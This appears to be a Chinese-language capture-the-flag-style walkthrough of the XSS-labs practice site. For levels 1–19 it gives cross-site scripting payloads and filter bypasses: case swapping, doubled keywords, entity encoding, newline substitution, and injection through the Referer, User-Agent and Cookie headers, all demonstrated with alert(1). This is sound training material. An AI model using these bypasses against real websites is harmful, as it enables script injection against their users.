# XSS-labs通关思路

## level1

直接提交payload就过了

```shell
?name=<script>alert(1)</script>
```

![level-01](images/11-XSS通关思路/level-01.png)



## level2

搜索框输入的内容被存到value参数中，把input标签闭合，新建image标签

```shell
'"><image src=x onmouseover="alert(1)">
```

![level-02](images/11-XSS通关思路/level-02-1.png)

![level-02-2](images/11-XSS通关思路/level-02-2.png)



## level3

输入的符号被htmlspecialchars编码了，但是没有对单引号转换

```shell
' onclick='alert(1)'
```

![level3-01](images/11-XSS通关思路/level3-01.png)



## level4

引号闭合value参数

```shell
'" onclick='alert(1)'
```

![level4-01](images/11-XSS通关思路/level4-01.png)



## level5

onclick被过滤，闭合原标签，新建A标签

```shell
'"> <a href='javascript:alert(1)'>text</a>
```

![level5-01](images/11-XSS通关思路/level5-01.png)

![level5-02](images/11-XSS通关思路/level5-02.png)



## level6

href被识别，使用大小写绕过成功

```shell
'"> <a hRef='javascript:alert(1)'>text</a>
```

![level6-01](images/11-XSS通关思路/level6-01.png)



## level7



```shell
'"> <a hRef='javascript:alert(1)'>text</a>  #尝试
```

![level7-01](images/11-XSS通关思路/level7-01.png)

href和script被过滤，尝试双写绕过成功

```shell
'"> <a hRhrefef='javascrscriptipt:alert(1)'>text</a>  #成功
```

![level7-02](images/11-XSS通关思路/level7-02.png)



## level8

搜素框输入的内容被放到了href属性中

```shell
javascript:alert(1) #尝试
```

![level8-01](images/11-XSS通关思路/level8-01.png)

script被识别到了，尝试编码绕过成功

```shell
java&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)  #成功
```

![level8-02](images/11-XSS通关思路/level8-02.png)



## level9

```shell
java&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)  #尝试
```

![level9-01](images/11-XSS通关思路/level9-01.png)

链接不合法是什么意思？链接···试试`http://`

```shell
java&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)//http://  #成功
```

![level9-02](images/11-XSS通关思路/level9-02.png)

加了一个注释的`http：//`后被正常识别了



## level10

这关没有输入框，但是地址栏可以提交参数

![level10-01](images/11-XSS通关思路/level10-01.png)

随便输入点什么，看看代码怎么处理输入信息的

![level10-02](images/11-XSS通关思路/level10-02.png)

输入信息被显示在纯文字部分，但是发现三个隐藏input标签，尝试提交这三个参数，发现突破口

![level10-03](images/11-XSS通关思路/level10-03.png)

闭合value属性，新增`onmouseover="alert(1)"`和`type="text"`

```shell
t_history=2&t_sort='" onmouseover="alert(1)" type="text"
```

![level10-04](images/11-XSS通关思路/level10-04.png)

鼠标移动到搜索框成功通关



## level11

在代码中发现一个名为`t_ref` 的`input`标签，可能是`referer`的意思

![level11-01](images/11-XSS通关思路/level11-01.png)

抓包后发现referer值与代码中的一样，有可能是数据包中的referer值被替换到代码中

![level11-02](images/11-XSS通关思路/level11-02.png)

修改referer值后放行，代码中t_ref被替换

```shell
" onclick="alert(1)" type="text"
```

![level11-03](images/11-XSS通关思路/level11-03.png)

点击搜索框成功通关



## level12

跟level11一样的思路，代码中发现一个`t_ua`，从值看出这应该是`user-agent`。尝试抓包修改`user-agent`值

![level12-01](images/11-XSS通关思路/level12-01.png)

```shell
" onclick="alert(1)" type="text"
```

![leve12-02](images/11-XSS通关思路/leve12-02.png)

![level12-03](images/11-XSS通关思路/level12-03.png)

点击搜索框后通关成功



## level13

代码中发现Cookie值，参考前两关思路可通关

```shell
" onclick="alert(1)" type="text"
```

![level13-01](images/11-XSS通关思路/level13-01.png)

![level13-02](images/11-XSS通关思路/level13-02.png)



## level14

这关报错了，不能正常玩，跳过

![level14](images/11-XSS通关思路/level14.png)



## level15

发现代码中有一个`ngInclude`

![level15-01](images/11-XSS通关思路/level15-01.png)

`ngInclude`是什么意思？搜一下

![level15-02](images/11-XSS通关思路/level15-02.png)

![level15-03](images/11-XSS通关思路/level15-03.png)

地址栏中传入src参数可以通过ngInclude参数指向一个同域的html页面，我们让他指向level1

```shell
?src='http://192.168.125.162/xss-labs/level1.php?name=test'
```

![level15-04](images/11-XSS通关思路/level15-04.png)

在第一关链接中加payload

```shell
?src='http://192.168.125.162/xss-labs/level1.php?name=<script>alert(1)</script>'
```

![level15-05](images/11-XSS通关思路/level15-05.png)

`script`标签没有效果，可能被过滤了，换`image`

```shell
?src="http://192.168.125.162/xss-labs/level1.php?name=<image src=x onclick='alert(1)'>"
```

![level15-06](images/11-XSS通关思路/level15-06.png)

点击图标，通关成功



## level16

空格被编码了

```shell
<image src=x onclick='alert(1)'>
```

![level16-01](images/11-XSS通关思路/level16-01.png)

把空格换成回车换行试试

```shell
<image%0asrc=x%0aonclick='alert(1)'>
```

![level16-02](images/11-XSS通关思路/level16-02.png)

点击图标成功通关



## level17

先找输入参数在代码中的位置

![level17-01](images/11-XSS通关思路/level17-01.png)

闭合前面参数，新增参数

````shell
' onmouseover='alert(1)'
````

鼠标移到标签范围通关成功

![level17-02](images/11-XSS通关思路/level17-02.png)



## level18

思路与level相同

```shell
' onmouseover=alert(1)
```



## level19

`embed` 标签加载的 `xsf03.swf` 会读取 URL 中的参数（比如 `?a=xxx`），并在 Flash 内部执行对应的 ActionScript 代码，从而触发 JS。

`xsf03.swf` 内部的 ActionScript 代码，会在 `arg01=version` 时，把 `arg02` 的值直接解析为 HTML 并渲染。

 `<a href='javascript:alert(1)'>text</a>` 会被 Flash 解析成可点击的链接，点击后触发 JS。

但现在浏览器已经全面禁用Flash插件，所以逻辑无法执行

```shell
?arg01=version&arg02=<a%20href=%27javascript:alert(1)%27>text</a>
```

![level19-01](images/11-XSS通关思路/level19-01.png)